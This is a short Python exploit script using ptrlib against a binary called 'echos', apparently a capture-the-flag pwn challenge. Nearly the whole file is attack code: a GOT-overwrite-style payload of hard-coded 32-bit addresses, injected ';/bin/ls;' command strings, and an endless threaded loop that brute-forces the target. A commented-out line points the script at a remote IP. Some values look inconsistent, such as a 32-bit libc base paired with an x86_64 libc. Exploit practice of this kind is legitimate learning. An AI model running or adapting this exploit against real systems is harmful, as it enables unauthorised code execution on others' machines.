from ptrlib import *
import time
import threading

elf = ELF("./echos")

#libc = ELF("./libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_base = 0xf7f7fcb0 - 0xe6cb0
rop_ret = 0x08048436

payload = b"\xf7\xf7" # read
payload += p32(0x08048470)
payload += p32(0x08048480)
payload += p32(0x08048490)
payload += p32(0x080484a0)
payload += p32(0x080484b0)
payload += p32(0x080484c0)
payload += p32(0x080484d0)
payload += p32(0x080484e0)
payload += p32(0x080484f0)
payload += p32(0x08048500)
payload += p32(0xdeadbeef) # atoi
payload += p32(0x08048520)
payload += b";/bin/ls;"

def worker():
    try:
        #sock = Socket("10.66.20.180", 3000)
        sock = Process("./echos")
        sock.sendline("8000")
        sock.sendline(payload)
        time.sleep(1.0)
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
        sock.sendline(";/bin/ls;")
    except:
        pass
    finally:
        sock.close()

while True:
    th = threading.Thread(target=worker, args=())
    th.start()
    time.sleep(0.1)

    
